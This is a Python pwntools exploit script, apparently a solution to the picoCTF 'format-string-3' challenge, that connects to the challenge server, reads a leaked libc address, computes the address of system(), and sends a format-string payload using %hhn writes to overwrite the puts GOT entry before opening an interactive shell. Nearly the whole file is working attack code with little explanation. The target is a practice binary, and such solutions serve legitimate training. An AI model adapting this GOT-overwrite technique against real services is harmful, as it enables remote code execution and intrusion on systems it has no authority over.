#!/usr/bin/env python3

# Not a 100% reliable exploit

from pwn import *

elf = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("rhea.picoctf.net", 58099)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    setbufoff = 0x7a3f0
    putsoff = 0x79bf0
    systemoff = 0x4f760
    pltputs = 0x404018

    io.recvline()
    io.recvuntil(b'libc: ')
    setbufadd = int(io.recv().strip(), 16)
    info(hex(setbufadd))
    libcadd = setbufadd - setbufoff
    info(hex(libcadd))
    systemadd = libcadd + systemoff
    info(hex(systemadd))

    sysaddhexstr = hex(systemadd)
    fstbyte = int(sysaddhexstr[12:].strip(), 16)
    info(fstbyte)
    secbyte = int(sysaddhexstr[10:][:2].strip(), 16)
    info(secbyte)
    thibyte = int(sysaddhexstr[8:][:2].strip(), 16)
    info(thibyte)

    payload = flat('%{}u'.format(fstbyte-1).encode(), b',%46$hhn,', '%{}u'.format(secbyte-fstbyte-2).encode(), b',%47$hhn,', '%{}u'.format(thibyte-secbyte-2).encode(), b',%48$hhn,AAAAAAAA,', b'AAAAAAAAAAAAAAAA', pltputs, pltputs+1, pltputs+2)
    print(payload)
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
